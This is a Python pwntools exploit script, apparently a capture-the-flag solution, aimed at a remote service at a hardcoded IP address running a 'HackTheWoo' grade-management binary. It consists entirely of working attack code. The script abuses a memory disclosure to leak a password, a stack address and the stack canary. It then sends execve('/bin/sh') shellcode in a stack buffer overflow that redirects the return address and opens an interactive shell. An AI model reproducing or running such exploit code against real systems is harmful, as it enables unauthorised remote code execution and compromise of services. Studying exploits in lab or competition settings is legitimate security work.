from pwn import *

#context.log_level = 'debug'

#r = process('./HackTheWoo.o')
r = remote('221.149.226.120', 31338)
print(r.recv())
r.sendline(b'1')#option 1
print(r.recv())
r.sendline(b'1'*40) #student number
print(r.recv())

r.send(b'a'*40)  #student name
print(r.recv())
r.send(b'A')
print(r.recv())

r.sendline(b'2')
r.recvuntil(b'a'*40) #memory disclosure password
password = r.recvuntil(b'\n')[0:4]
password = u32(password)
print('this is the password')
print(password)

print(r.recv())

r.sendline(b'1')
print(r.recv())
r.sendline(b'1'*40) #student number
print(r.recv())

r.send(b'a'*40)  #student name
print(r.recv())
r.send(b'A+aaa')
print(r.recv())
r.send(p32(password)) #sent the correct password grade = A+
print(r.recv())

r.sendline(b'3')
print(r.recv())

HalfBof = b'a'*40
HalfBof += b'1234' #passcode was changed to 1234
HalfBof += b'a'*4  #std number, want to over \n
r.send(HalfBof)
print(r.recvuntil(b'\n'))
print(r.recvuntil(b'\n'))
stack = r.recvuntil(b'\n')[:-1]
stack = int(stack,16)
print(hex(stack))
print(r.recv())

r.sendline(b'2') #getting the canary
#print(r.recv())
r.recvuntil(b'a'*40)
r.recvuntil(b'1234')
r.recvuntil(b'aaaa')
r.recvuntil(b'A+aaa')
canary = r.recvuntil(b'\n')[0:3]
canary = u32(b'\x00'+canary)
print(hex(canary))
print(r.recv())

r.sendline(b'1')#option 1
print(r.recv())
r.sendline(b'1'*40) #student number
print(r.recv())

r.send(b'a'*40)  #student name
print(r.recv())
r.send(b'A+')
print(r.recv())
r.send(b'1234')
print(r.recv())

r.sendline(b'3')

print(r.recv())
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += b'a'*4 #passcode
ex += b'a'*4 #std number
ex += b'a'*4 #char grade
ex += p32(canary)
ex += b'a'*4 #sfp
ex += p32(stack)
r.send(ex)
r.interactive()
                          
